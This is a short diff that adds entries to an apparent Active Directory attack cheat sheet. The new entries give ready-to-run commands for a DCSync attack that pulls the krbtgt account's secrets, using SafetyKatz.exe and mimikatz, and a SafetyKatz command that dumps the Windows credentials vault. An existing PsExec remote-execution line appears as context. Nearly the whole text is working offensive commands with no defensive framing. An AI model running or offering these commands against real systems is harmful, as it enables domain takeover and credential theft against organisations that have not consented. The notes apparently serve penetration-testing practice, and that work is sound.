@@ -65,3 +65,26 @@ Execute a process remotely using PsExec.
 ```
 PsExec64.exe cmd \\test.tech.com
 ```
+
+## DCSync
+
+Execute DCSync attack via SafetyKatz.exe.
+
+```
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:test\krbtgt" "exit"
+```
+
+Execute DCSync attack via mimikatz.exe.
+
+```
+privileges::debug
+lsadump::dcsync /user:test\krbtgt
+```
+
+## Credentials Vault
+
+Dump credentials vault with SafetyKatz.exe.
+
+```
+C:\AD\Tools\SafetyKatz.exe "token::elevate" "vault::cred /patch" "exit"
+```
